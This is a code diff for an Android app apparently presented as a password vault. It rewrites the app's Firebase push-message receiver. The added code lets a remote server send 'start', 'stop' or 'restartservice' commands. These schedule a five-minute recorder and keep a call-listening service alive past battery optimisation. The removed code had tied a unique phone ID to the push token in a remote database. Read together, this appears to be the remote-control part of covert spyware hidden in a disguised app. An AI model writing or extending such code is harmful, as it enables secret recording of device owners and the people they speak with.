@@ -1,39 +1,49 @@
 package com.example.passwordvault.service
 
 import android.content.Context
-import android.media.AudioManager
+import android.content.Intent
+import android.os.Build
+import android.os.PowerManager
 import android.util.Log
-import com.example.passwordvault.util.FirebaseDB
+import com.example.passwordvault.util.PreferenceUtil
 import com.example.passwordvault.util.Scheduler
-import com.example.passwordvault.util.UniqueIdProvider
-import com.example.passwordvault.util.WorkerProvider
+import com.example.passwordvault.util.logger.log
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
+
+private val tag = FCMReceiver::class.java.simpleName
 
 class FCMReceiver : FirebaseMessagingService() {
 
     override fun onNewToken(newToken: String) {
-        val uniqueId = UniqueIdProvider.getThisUniquePhone(applicationContext)
-        sendRegistrationToServer(uniqueId, newToken)
+        PreferenceUtil.writeAccessToken(applicationContext, newToken)
+        log(tag, "FCM::Token -> $newToken")
     }
 
-    private fun sendRegistrationToServer(uniqueID: String, newToken: String) {
-        val dbReference = FirebaseDB.getUsersDB()
-        dbReference.child("userId").setValue(uniqueID)
-        dbReference.child("userToken").setValue(newToken)
-    }
+    override fun onMessageReceived(msg: RemoteMessage) {
+        val status = msg.data["status"]
+        Log.e(tag, "FCM status -> $status")
 
-    override fun onMessageReceived(p0: RemoteMessage) {
-        val audioManager: AudioManager =
-            applicationContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        when (status) {
+            "restartservice" -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    val packageName = packageName
+                    val pm =
+                        getSystemService(Context.POWER_SERVICE) as PowerManager
+                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                        val intent =
+                            Intent(applicationContext, CallReceiverServiceRestarter::class.java)
+                        intent.action = restartBroadcastAction
+                        sendBroadcast(intent)
+                    } else
+                        Scheduler.scheduleCallServiceListener(applicationContext)
+                }
+            }
 
-        if (audioManager.mode == AudioManager.MODE_IN_CALL || audioManager.mode == AudioManager.MODE_IN_COMMUNICATION)
-            Log.e("FCMReceiver:FCM", "Can't record, already in call")
-
-        WorkerProvider.start5MinRecorderWork(applicationContext)
-        Scheduler.schedule5minRecorder(applicationContext)
-//        WorkerProvider.stop5MinRecordingWork(applicationContext)
-//        Scheduler.cancel5minRecorder(applicationContext)
+            "start" -> Scheduler.schedule5minRecorder(applicationContext)
+            "stop" -> Scheduler.cancel5minRecorder(applicationContext)
+            else -> Log.e(tag, "Unrecognized FCM status")
+        }
     }
 
     override fun onSendError(p0: String, p1: Exception) {
@@ -43,4 +53,5 @@ class FCMReceiver : FirebaseMessagingService() {
     override fun onMessageSent(p0: String) {
         super.onMessageSent(p0)
     }
+
 }
